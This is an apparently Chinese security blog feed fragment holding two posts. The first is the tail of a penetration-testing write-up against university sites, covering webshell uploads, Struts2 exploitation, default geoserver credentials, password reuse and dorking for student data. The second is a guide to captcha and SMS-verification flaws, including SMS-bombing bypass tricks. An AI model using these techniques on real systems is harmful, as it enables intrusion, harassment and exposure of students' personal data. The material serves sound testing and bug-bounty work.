</div><h2 id="6fckeditor上传文件getshell" class="headerLink">
    <a href="#6fckeditor%e4%b8%8a%e4%bc%a0%e6%96%87%e4%bb%b6getshell" class="header-mark"></a>6、FCKeditor上传文件GetShell</h2><p>1、扫描目录发现存在FCKeditor目录</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666751266790-5f2d4764-4b13-4631-b1c1-42e0d6d088a7.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666751266790-5f2d4764-4b13-4631-b1c1-42e0d6d088a7.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666751266790-5f2d4764-4b13-4631-b1c1-42e0d6d088a7.png">
        
    </a></p>
<p>2、直接找到上传目录</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666751284531-abae4065-7838-4bf5-924f-8d104c2fb223.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666751284531-abae4065-7838-4bf5-924f-8d104c2fb223.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666751284531-abae4065-7838-4bf5-924f-8d104c2fb223.png">
        
    </a></p>
<p>3、上传aspx木马</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666751504910-d5285488-0339-462b-ada1-1346eaa68abf.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666751504910-d5285488-0339-462b-ada1-1346eaa68abf.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666751504910-d5285488-0339-462b-ada1-1346eaa68abf.png">
        
    </a></p>
<p>成功连接</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666784664171-01d8a4d6-e95b-46af-b8b5-327d54763a7f.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666784664171-01d8a4d6-e95b-46af-b8b5-327d54763a7f.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666784664171-01d8a4d6-e95b-46af-b8b5-327d54763a7f.png">
        
    </a></p>
<h2 id="7任意文件上传" class="headerLink">
    <a href="#7%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0" class="header-mark"></a>7、任意文件上传</h2><p>根据学校名称及域名进行编排密码本，爆破登录admin账号</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666776557415-4feb5ad0-efd9-481f-bed9-319f2b8aad15.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666776557415-4feb5ad0-efd9-481f-bed9-319f2b8aad15.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666776557415-4feb5ad0-efd9-481f-bed9-319f2b8aad15.png">
        
    </a></p>
<p>上传点任意文件上传GetShell</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666785479063-5b0d697a-e7d0-4f63-8a19-0f8101636156.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666785479063-5b0d697a-e7d0-4f63-8a19-0f8101636156.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666785479063-5b0d697a-e7d0-4f63-8a19-0f8101636156.png">
        
    </a></p>
<h2 id="8s2反序列化漏洞getshell" class="headerLink">
    <a href="#8s2%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9egetshell" class="header-mark"></a>8、S2反序列化漏洞GetShell</h2><p>1、目标网站存在S2框架</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666776108230-74b6480c-66a3-43db-b0bd-62246f03e843.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666776108230-74b6480c-66a3-43db-b0bd-62246f03e843.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666776108230-74b6480c-66a3-43db-b0bd-62246f03e843.png">
        
    </a></p>
<p>2、直接使用工具进行扫描，进而获取权限进行内网渗透</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666776138378-0e6ce6a1-96fc-4f65-8e78-97a047dd1366.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666776138378-0e6ce6a1-96fc-4f65-8e78-97a047dd1366.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666776138378-0e6ce6a1-96fc-4f65-8e78-97a047dd1366.png">
        
    </a></p>
<h2 id="9逻辑漏洞" class="headerLink">
    <a href="#9%e9%80%bb%e8%be%91%e6%bc%8f%e6%b4%9e" class="header-mark"></a>9、逻辑漏洞</h2><h2 id="找回密码-1" class="headerLink">
    <a href="#%e6%89%be%e5%9b%9e%e5%af%86%e7%a0%81-1" class="header-mark"></a>找回密码</h2><p>1、某站点找回密码处，短信验证码直接出现在回包中</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1668568283334-9db8b8ed-0570-4fa8-9d7f-e753cea954ee.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1668568283334-9db8b8ed-0570-4fa8-9d7f-e753cea954ee.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1668568283334-9db8b8ed-0570-4fa8-9d7f-e753cea954ee.png">
        
    </a></p>
<p>2、谷歌语法搜索 &ldquo;XX大学&rdquo; &ldquo;手机号&rdquo; filetype:xls 找到一些手机号码</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1668568792733-fc7286a9-ebae-4e11-9602-0c87472a19c0.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1668568792733-fc7286a9-ebae-4e11-9602-0c87472a19c0.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1668568792733-fc7286a9-ebae-4e11-9602-0c87472a19c0.png">
        
    </a></p>
<p>3、找回功能-修改密码-登录系统，发现是一个学校党务的测试系统</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1668568895234-da8add04-05a1-4c43-98f9-139cfd0911e2.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1668568895234-da8add04-05a1-4c43-98f9-139cfd0911e2.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1668568895234-da8add04-05a1-4c43-98f9-139cfd0911e2.png">
        
    </a></p>
<p>但其中数据是真实的，有上千份姓名、手机号、学号、身份证等信息</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1668568950748-9ca6a64a-5b21-4ed6-948b-49fa601e0749.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1668568950748-9ca6a64a-5b21-4ed6-948b-49fa601e0749.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1668568950748-9ca6a64a-5b21-4ed6-948b-49fa601e0749.png">
        
    </a></p>
<h2 id="统一门户-1" class="headerLink">
    <a href="#%e7%bb%9f%e4%b8%80%e9%97%a8%e6%88%b7-1" class="header-mark"></a>统一门户</h2><p>使用学号加身份证后六位直接登录统一服务平台</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1668569051358-6da59c9f-6c6a-4494-aff8-1e47677e8dd0.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1668569051358-6da59c9f-6c6a-4494-aff8-1e47677e8dd0.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1668569051358-6da59c9f-6c6a-4494-aff8-1e47677e8dd0.png">
        
    </a></p>
<h2 id="10geoserver弱口令" class="headerLink">
    <a href="#10geoserver%e5%bc%b1%e5%8f%a3%e4%bb%a4" class="header-mark"></a>10、geoserver弱口令</h2><p>8085端口geoserver，进入登陆页面，使用默认账号密码admin/geoserver成功登录后台。</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-2b467edae299849fded88fedaab939758dc8bb10.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-2b467edae299849fded88fedaab939758dc8bb10.png">
        
    </a></p>
<h2 id="获取数据库密码" class="headerLink">
    <a href="#%e8%8e%b7%e5%8f%96%e6%95%b0%e6%8d%ae%e5%ba%93%e5%af%86%e7%a0%81" class="header-mark"></a>获取数据库密码</h2><p>登录后进入配置页面，点击查看其中的数据存储</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1647229297688-db68488b-87b4-4ca6-b03f-5a6bfb0b5a11.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1647229297688-db68488b-87b4-4ca6-b03f-5a6bfb0b5a11.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1647229297688-db68488b-87b4-4ca6-b03f-5a6bfb0b5a11.png">
        
    </a></p>
<p>F12查看网页源代码，读取PostgreSQL密码：</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1647229765154-913dace2-7edf-4edf-9ebb-2aeb8d10e768.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1647229765154-913dace2-7edf-4edf-9ebb-2aeb8d10e768.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1647229765154-913dace2-7edf-4edf-9ebb-2aeb8d10e768.png">
        
    </a></p>
<h2 id="撞库" class="headerLink">
    <a href="#%e6%92%9e%e5%ba%93" class="header-mark"></a>撞库</h2><p>同时发现目标ip还对外开启了mysql数据库，使用root和上文获取到的密码，成功连接上。</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1647156446393-3b7082e3-a5ee-4ed2-a176-8e82d6cea89b.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1647156446393-3b7082e3-a5ee-4ed2-a176-8e82d6cea89b.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1647156446393-3b7082e3-a5ee-4ed2-a176-8e82d6cea89b.png">
        
    </a></p>
<p>在其中一个log表中发现了账号和MD5加密的密码。</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1647225840493-7f4c3375-9e80-4c8b-a4bb-1a3723692233.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1647225840493-7f4c3375-9e80-4c8b-a4bb-1a3723692233.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1647225840493-7f4c3375-9e80-4c8b-a4bb-1a3723692233.png">
        
    </a></p>
<h2 id="getshell" class="headerLink">
    <a href="#getshell" class="header-mark"></a>GetShell</h2><p>8888端口后台登录页，使用数据库中获取到的账号密码成功登录后台，发现是个金碟的系统，然后使用了文件上传漏洞，成功getshell（截图和payload有点敏感，就不放了）</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1647228656279-8ac6d1f6-ae66-4517-ac13-43aedf9b3ddc.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1647228656279-8ac6d1f6-ae66-4517-ac13-43aedf9b3ddc.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1647228656279-8ac6d1f6-ae66-4517-ac13-43aedf9b3ddc.png">
        
    </a></p>
<h2 id="总结" class="headerLink">
    <a href="#%e6%80%bb%e7%bb%93" class="header-mark"></a>总结：</h2><p>对于高校的渗透可以从以下几点入手</p>
<p>1、VPN弱口令，GitHub泄漏是重灾区，可以搜索&quot;学校域名&quot; &ldquo;password&rdquo;</p>
<p>2、高校的站点一般比较老旧，aspx的站点比较多，可以多关注一下SQL注入，大多数的后台都存在SQL注入。</p>
<p>3、多扫下目录，有些存在各种编辑器的漏洞，但是一些漏洞可能是伪修复了，比如说ueditor的文件上传，可能只是把参数名更换了，只要找到正确的参数名就可以继续利用。</p>
<p>4、百度谷歌高级搜索学号文件，多收集一些账号，搜集网站的使用说明文件，其中有对密码组成进行说明，如身份证后六位等，针对一些管理员的账号进行密码的编排</p>
<p>5、QQ官方群有一些敏感文件，可以使用上面搜集到的信息混入其中</p>
<p>总结起来就是多信息收集，信息收集yyds</p>]]></description>
</item><item>
    <title>验证码渗透最全总结</title>
    <link>https://www.bysec.cn/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/</link>
    <pubDate>Mon, 20 May 2024 17:55:46 &#43;0800</pubDate><author>
        <name>bysec</name>
    </author><guid>https://www.bysec.cn/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/</guid>
    <description><![CDATA[<blockquote>
<p><em>转载自： <a href="https://forum.butian.net/share/2602" target="_blank" rel="noopener noreferrer">https://forum.butian.net/share/2602</a></em></p>
</blockquote>
<h2 id="验证码渗透最全总结" class="headerLink">
    <a href="#%e9%aa%8c%e8%af%81%e7%a0%81%e6%b8%97%e9%80%8f%e6%9c%80%e5%85%a8%e6%80%bb%e7%bb%93" class="header-mark"></a>验证码渗透最全总结</h2><p>不少人在碰见验证码的时候，大多数只是看了一眼就过去了，没想到验证码还有啥可测试的。但其实验证码也能在项目中导致<strong>高危</strong>,并且验证码漏洞能在一定情况下造成危害。</p>
<h2 id="验证码总结" class="headerLink">
    <a href="#%e9%aa%8c%e8%af%81%e7%a0%81%e6%80%bb%e7%bb%93" class="header-mark"></a>验证码总结</h2><p>验证码分为两块内容，一块是图形验证码，一块是短信验证码。下面是对这些技巧总结的思维导图。</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-07aa8805b4a3ac1f699898097c63b75d100e7c61.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-07aa8805b4a3ac1f699898097c63b75d100e7c61.png">
        
    </a></p>
<h3 id="图形验证码" class="headerLink">
    <a href="#%e5%9b%be%e5%bd%a2%e9%aa%8c%e8%af%81%e7%a0%81" class="header-mark"></a>图形验证码</h3><h4 id="图形验证码长宽可控" class="headerLink">
    <a href="#%e5%9b%be%e5%bd%a2%e9%aa%8c%e8%af%81%e7%a0%81%e9%95%bf%e5%ae%bd%e5%8f%af%e6%8e%a7" class="header-mark"></a>图形验证码长宽可控</h4><p>简单测试方法，就是看到一个登录框，然后新建打开图片链接，在图片链接中就有机会看到两个参数值，一个是 width，一个是 length。这两个参数是计算图片验证码的长宽，如果长宽过高就会过度消耗的是服务器的 CPU 资源。</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-f8edf220db2f6f553e493615a6245671be2f3cc8.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-f8edf220db2f6f553e493615a6245671be2f3cc8.png">
        
    </a><br>
当length为比较大的时候，响应时间为2767millis<br>
<a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-23af811d5dc12caad125af766529881f2fe7a073.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-23af811d5dc12caad125af766529881f2fe7a073.png">
        
    </a><br>
<strong>注意</strong>：该漏洞能造成服务器拒绝服务攻击。有的 SRC 里面注明了，禁止使用 DDOS 攻击，这种漏洞是不收的，如果提交了漏洞，很有可能面临<strong>法律责任</strong>。</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-9f2f1a9fdac9a1537fc050f5b62bfc6516573602.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-9f2f1a9fdac9a1537fc050f5b62bfc6516573602.png">
        
    </a></p>
<h4 id="图形验证码可绕过" class="headerLink">
    <a href="#%e5%9b%be%e5%bd%a2%e9%aa%8c%e8%af%81%e7%a0%81%e5%8f%af%e7%bb%95%e8%bf%87" class="header-mark"></a>图形验证码可绕过</h4><p>有时候开发，会写两套图形验证码流程，一套是在生产运行阶段必须使用正确验证码才能通过服务器校验。另外一套是在测试 SIT 环境下，把验证码设置为只要是 null 或者是空都可以登录验证码置为空，提高开发工作效率。还有的时候，将验证码修改为 true 就好了。这个是因为开发在进行图形验证码判断的时候，只要是验证码收到的是 true 就会通过。具体测试过程已经找不到了，大概写一下吧。</p>
<h4 id="图形验证码不失效" class="headerLink">
    <a href="#%e5%9b%be%e5%bd%a2%e9%aa%8c%e8%af%81%e7%a0%81%e4%b8%8d%e5%a4%b1%e6%95%88" class="header-mark"></a>图形验证码不失效</h4><p>简单易懂，图形验证码没有对应的失效机制。导致图形验证码能被多次利用。图形验证码在使用后未失效，发送短信时抓包，发送到Repeter中进行重放，可以发送成功!</p>
<h4 id="图形验证码可识别" class="headerLink">
    <a href="#%e5%9b%be%e5%bd%a2%e9%aa%8c%e8%af%81%e7%a0%81%e5%8f%af%e8%af%86%e5%88%ab" class="header-mark"></a>图形验证码可识别</h4><p>这个就是开发在制作图形验证码功能的时候，没有将图形验证码加入足够多的噪点，使验证码能够被现有的工具进行识别。一般是项目硬凑数用的，SRC 全部都不收。具体不做解释</p>
<h4 id="图形验证码随机值可控" class="headerLink">
    <a href="#%e5%9b%be%e5%bd%a2%e9%aa%8c%e8%af%81%e7%a0%81%e9%9a%8f%e6%9c%ba%e5%80%bc%e5%8f%af%e6%8e%a7" class="header-mark"></a>图形验证码随机值可控</h4><p>都知道图形验证码是后端随机生成的。那么随机生成的时候，有没有可能是能控制这个随机值？有可能! 生成验证码的随机值被写在了 url 里面<br>
<a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-e20c13ca97d25e047ade9b3bd983a245cffe43b4.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-e20c13ca97d25e047ade9b3bd983a245cffe43b4.png">
        
    </a></p>
<p>将characters固定为aaaa，可以看到图形验证码为aaaa<br>
<a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-2aaf0c5c6bd69d7d5452b3bc34f22c22b702cc77.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-2aaf0c5c6bd69d7d5452b3bc34f22c22b702cc77.png">
        
    </a></p>
<h4 id="图形验证码返回到前端" class="headerLink">
    <a href="#%e5%9b%be%e5%bd%a2%e9%aa%8c%e8%af%81%e7%a0%81%e8%bf%94%e5%9b%9e%e5%88%b0%e5%89%8d%e7%ab%af" class="header-mark"></a>图形验证码返回到前端</h4><p>测试过程已经找不到了，口头描述下大致就是登录后会在响应包中返回了下次图形验证码的内容。</p>
<h3 id="短信验证码" class="headerLink">
    <a href="#%e7%9f%ad%e4%bf%a1%e9%aa%8c%e8%af%81%e7%a0%81" class="header-mark"></a>短信验证码</h3><p>我们已经写完了图形验证码部分，现实情况下短信验证码也是比较多。短信验证码的漏洞技巧要比图形验证码<strong>多很多</strong></p>
<h4 id="短信炸弹纵向" class="headerLink">
    <a href="#%e7%9f%ad%e4%bf%a1%e7%82%b8%e5%bc%b9%e7%ba%b5%e5%90%91" class="header-mark"></a>短信炸弹纵向</h4><p>在一个限制时间的情况下对一个手机号，发送的短信验证码条数超过发送预期，这种漏洞我们都称为<code>短信炸弹</code>or<code>短信轰炸</code>or<code>短信炸弹纵向</code><br>
<a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-9ee1bcaa0a03fc53f87c05e0a5a038a39bcc48bb.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-9ee1bcaa0a03fc53f87c05e0a5a038a39bcc48bb.png">
        
    </a><br>
<a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-d3aa32373abf5cf438642122ea553b6f9b1e1925.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-d3aa32373abf5cf438642122ea553b6f9b1e1925.png">
        
    </a><br>
不停点击repeter或者放到intruder里面，就可以实现一个手机号接收到多条短信<br>
<a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-5b65929eb4576fc9bacc70153d32df2ef028b37a.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-5b65929eb4576fc9bacc70153d32df2ef028b37a.png">
        
    </a></p>
<h4 id="短信炸弹横向" class="headerLink">
    <a href="#%e7%9f%ad%e4%bf%a1%e7%82%b8%e5%bc%b9%e6%a8%aa%e5%90%91" class="header-mark"></a>短信炸弹横向</h4><p>上面我们提到了在限定时间内，对一个手机号发送超过预期的短信条数是短信轰炸。造成的结果就是浪费短信资源。如果开发把这个漏洞给改了，那么还有没有漏洞？还有？不能给一个人发送短信验证了，那么给其他人发送验证码一样的。<br>
<a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-7dcfda9d6162e5385a3f94aee05566b7ca188ba3.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-7dcfda9d6162e5385a3f94aee05566b7ca188ba3.png">
        
    </a><br>
<a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-49694c38b745d0949ae23a750b711c645018d603.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-49694c38b745d0949ae23a750b711c645018d603.png">
        
    </a><br>
将phone设置成变量，进行遍历<br>
<a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-1336295b9eb2d85f64ea1c6ec3f2a4513503529d.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-1336295b9eb2d85f64ea1c6ec3f2a4513503529d.png">
        
    </a></p>
<h4 id="短信验证码可爆破" class="headerLink">
    <a href="#%e7%9f%ad%e4%bf%a1%e9%aa%8c%e8%af%81%e7%a0%81%e5%8f%af%e7%88%86%e7%a0%b4" class="header-mark"></a>短信验证码可爆破</h4><p>我们讲了 2 个发送短信验证码，都知道验证码通常 4 位数或者 6 位数的数字验证码。如果服务器没有限制提交的验证码的次数，那么我们可以爆破这个验证码。并且如果有 4 位验证码被爆破成功的话，在 SRC 里面通常是按照高危处理。</p>
<h4 id="短信验证码可编辑" class="headerLink">
    <a href="#%e7%9f%ad%e4%bf%a1%e9%aa%8c%e8%af%81%e7%a0%81%e5%8f%af%e7%bc%96%e8%be%91" class="header-mark"></a>短信验证码可编辑</h4><p>我们讲了发送短信验证码以及爆破短信验证码。我们知道短信验证码功能发送的是短信，那么我们就有可能把短信内容给更改。<br>
<a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-a65ad9daae02cac08992fedca5bb6e768d759359.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-a65ad9daae02cac08992fedca5bb6e768d759359.png">
        
    </a><br>
<a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-3dd9859a71ffbf19616b439137a403e573f45f6f.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-3dd9859a71ffbf19616b439137a403e573f45f6f.png">
        
    </a><br>
通过修改transAmt 参数内容，可随意修改短信内容<br>
<a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-b910d6dc4e0703a3c7825f053ed10fc6211a8129.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-b910d6dc4e0703a3c7825f053ed10fc6211a8129.png">
        
    </a></p>
<h3 id="短信炸弹的绕过技巧" class="headerLink">
    <a href="#%e7%9f%ad%e4%bf%a1%e7%82%b8%e5%bc%b9%e7%9a%84%e7%bb%95%e8%bf%87%e6%8a%80%e5%b7%a7" class="header-mark"></a>短信炸弹的绕过技巧</h3><p>我们在了解基础短信验证码的漏洞后，相应的开发也会进行了解。那么我们就需要增加技巧来绕过这些东西。</p>
<h4 id="短信炸弹的绕过技巧-1--特殊字符" class="headerLink">
    <a href="#%e7%9f%ad%e4%bf%a1%e7%82%b8%e5%bc%b9%e7%9a%84%e7%bb%95%e8%bf%87%e6%8a%80%e5%b7%a7-1--%e7%89%b9%e6%ae%8a%e5%ad%97%e7%ac%a6" class="header-mark"></a>短信炸弹的绕过技巧 1&ndash;特殊字符</h4><p>通常，开发在发送短信验证码的时候，没有对特殊字符进行过滤。比如在手机号是 15312341234。我们加上+86，变成+8615312341234，这样的话服务器就有可能判定为两个手机号了。</p>
<p>在 mobile=15312341234 的前面，加<code>空格</code>，<code>86</code>，<code>086</code>，<code>0086</code>，<code>+86</code>，<code>0</code>，<code>00</code>，<code>/r,/n</code>,<code>?</code>,<code>#</code>,<code>!</code>,<code>,</code>&hellip;只要想法多就有可能绕过。<br>
<a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-cdfb9f6773ed4c516bfff1b1b64f429e0c00c0fe.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-cdfb9f6773ed4c516bfff1b1b64f429e0c00c0fe.png">
        
    </a></p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-176b46bb24c9974b759d9af83924bcf1f76799a1.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-176b46bb24c9974b759d9af83924bcf1f76799a1.png">
        
    </a><br>
控制phone参数进行攻击<br>
<a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-b0755303a59aa0bf852a2964d3409ef1f5624ccf.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-b0755303a59aa0bf852a2964d3409ef1f5624ccf.png">
        
    </a></p>
<h4 id="短信炸弹的绕过技巧-2--添加-xff" class="headerLink">
    <a href="#%e7%9f%ad%e4%bf%a1%e7%82%b8%e5%bc%b9%e7%9a%84%e7%bb%95%e8%bf%87%e6%8a%80%e5%b7%a7-2--%e6%b7%bb%e5%8a%a0-xff" class="header-mark"></a>短信炸弹的绕过技巧 2&ndash;添加 XFF</h4><p>在请求包中添加XFF头，有的时候服务器是按照IP地址进行判定的。</p>
<h4 id="短信炸弹的绕过技巧-3--添加多个值" class="headerLink">
    <a href="#%e7%9f%ad%e4%bf%a1%e7%82%b8%e5%bc%b9%e7%9a%84%e7%bb%95%e8%bf%87%e6%8a%80%e5%b7%a7-3--%e6%b7%bb%e5%8a%a0%e5%a4%9a%e4%b8%aa%e5%80%bc" class="header-mark"></a>短信炸弹的绕过技巧 3&ndash;添加多个值</h4><p>在发送手机短信验证码的时候可以把一个参数赋上多个值。比如 Mobile=18312341234,13612341234&amp;code=1234</p>
<h4 id="短信炸弹的绕过技巧-4--添加多个参数" class="headerLink">
    <a href="#%e7%9f%ad%e4%bf%a1%e7%82%b8%e5%bc%b9%e7%9a%84%e7%bb%95%e8%bf%87%e6%8a%80%e5%b7%a7-4--%e6%b7%bb%e5%8a%a0%e5%a4%9a%e4%b8%aa%e5%8f%82%e6%95%b0" class="header-mark"></a>短信炸弹的绕过技巧 4&ndash;添加多个参数</h4><p>比如 Mobile=18312341234&amp;Mobile=13612341234</p>
<h4 id="短信炸弹的绕过技巧-5--修改返回包" class="headerLink">
    <a href="#%e7%9f%ad%e4%bf%a1%e7%82%b8%e5%bc%b9%e7%9a%84%e7%bb%95%e8%bf%87%e6%8a%80%e5%b7%a7-5--%e4%bf%ae%e6%94%b9%e8%bf%94%e5%9b%9e%e5%8c%85" class="header-mark"></a>短信炸弹的绕过技巧 5&ndash;修改返回包</h4><p>在发送短信验证码的数据包，修改返回包的 Flase 为 Success</p>
<h4 id="短信炸弹的绕过技巧-6--并发" class="headerLink">
    <a href="#%e7%9f%ad%e4%bf%a1%e7%82%b8%e5%bc%b9%e7%9a%84%e7%bb%95%e8%bf%87%e6%8a%80%e5%b7%a7-6--%e5%b9%b6%e5%8f%91" class="header-mark"></a>短信炸弹的绕过技巧 6&ndash;并发</h4><p>对短信验证码的数据包进行并发，有机会绕过限制</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-569f362e7ef69d7c32d5f7a714ec89b1486b42fd.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-569f362e7ef69d7c32d5f7a714ec89b1486b42fd.png">
        
    </a><br>
<a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-2e05570fe2a88f4cb915508987e529e497cf9acf.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-2e05570fe2a88f4cb915508987e529e497cf9acf.png">
        
    </a></p>
<h4 id="在响应包里面可以看到短信验证码" class="headerLink">
    <a href="#%e5%9c%a8%e5%93%8d%e5%ba%94%e5%8c%85%e9%87%8c%e9%9d%a2%e5%8f%af%e4%bb%a5%e7%9c%8b%e5%88%b0%e7%9f%ad%e4%bf%a1%e9%aa%8c%e8%af%81%e7%a0%81" class="header-mark"></a>在响应包里面可以看到短信验证码</h4><p>在抓取短信验证码的数据包后，在 response 可以看到短信验证码</p>
<h4 id="提交别人的验证码" class="headerLink">
    <a href="#%e6%8f%90%e4%ba%a4%e5%88%ab%e4%ba%ba%e7%9a%84%e9%aa%8c%e8%af%81%e7%a0%81" class="header-mark"></a>提交别人的验证码</h4><p>假设有一个需要短信验证码功能点。给自己手机号 13512341234 发送验证码为 111111，给别人手机号 18312341234 收到验证码为 222222。那么自己手机号使用 222222 验证码，也能正常登录</p>
<h4 id="每次短信验证码都是同一个" class="headerLink">
